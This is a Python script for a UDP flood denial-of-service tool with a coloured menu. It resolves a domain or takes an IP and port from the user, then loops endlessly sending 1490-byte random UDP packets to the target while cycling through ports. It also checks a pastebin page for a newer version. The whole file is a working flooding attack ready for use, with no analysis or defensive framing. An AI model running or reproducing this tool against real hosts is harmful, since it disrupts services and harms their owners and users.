#importing all the required libraries

from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
#platform info
uname=system()
if uname=="Windows":
	cmd='cls'
else :
	cmd='clear'
os.system(cmd)

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#############
def chech_con():
	try:
		request.urlopen('https://www.google.co.in/',timeout=3)
	except KeyboardInterrupt:
		print(Fore.RED + "Stopped by User" + Fore.RESET)
		exit()
	except:
		print(Fore.RED+'Please Check your connection'+Fore.RESET)
		exit()
def update():
	import urllib.request as urequest
	from bs4 import BeautifulSoup as soup
	page=urequest.urlopen('https://pastebin.com/G7gFkwfb').read()
	soup=soup(page,'html.parser')
	version=soup.find('div',class_='de1').text
	if version>de_version:
		import webbrowser
		print(Fore.CYAN + "Version " + Fore.MAGENTA + version + Fore.CYAN + " is Avaiable")
		print(Fore.RED + "Please update the Program")
		print("Redirecting...." + Fore.RESET)
		time.sleep(3)
		webbrowser.open('https://www.google.com/')
		exit()
	else:
		pass
try:
	print(Fore.CYAN+" Checking For Internet "+Fore.RESET)
	time.sleep(2)
	chech_con()
	update()
	os.system(cmd)
except KeyboardInterrupt:
	print(Fore.RED + "Stopped by User" + Fore.RESET)
	exit()
try:
	while True:
		print(Fore.RED+"1. Website Domain\n2. IP Addresse\n3. Exit"+Fore.RESET)
		opt=str(input(Fore.GREEN+"\nEnter Your choice: "+Fore.RESET))
		if opt=='1':
			domain=str(input(Fore.CYAN+"Enter The Website (eg:google.com):"+Fore.RESET))
			ip=socket.gethostbyname(domain)
			break
		elif opt=='2':
			ip = input(Fore.CYAN+"IP Addresse  : "+Fore.RESET)
			break
		elif opt=='3':
			time.sleep(1)
			print(Fore.RED+"See you S00N"+Fore.RESET)
			exit()
		else:
			print(Fore.RED+'Invaild Choice!'+Fore.RESET)
			time.sleep(2)
			os.system(cmd)
	port =int(input(Fore.CYAN+"Port Number  : "+Fore.RESET))
	os.system(cmd)
	print(Fore.CYAN+"INITIALIZING....")
	for i in tqdm(range(10000)):
		print(end='\r')
	time.sleep(4)
	print('STARTING...')
	time.sleep(4)
	sent = 0
except Exception as e:
	print(Fore.RED+"Something Went Wrong!")
	print("Reason:",e,Fore.RESET)
	exit()
try:
	while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print(Fore.CYAN+ "Sent %s packet to %s throught port:%s" % (sent, ip, port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901
except Exception as e:
	print(Fore.RED+"Exited\nReason: ",e,Fore.RESET)
except KeyboardInterrupt:
	print(Fore.RED+"\nStopped by User"+Fore.RESET)
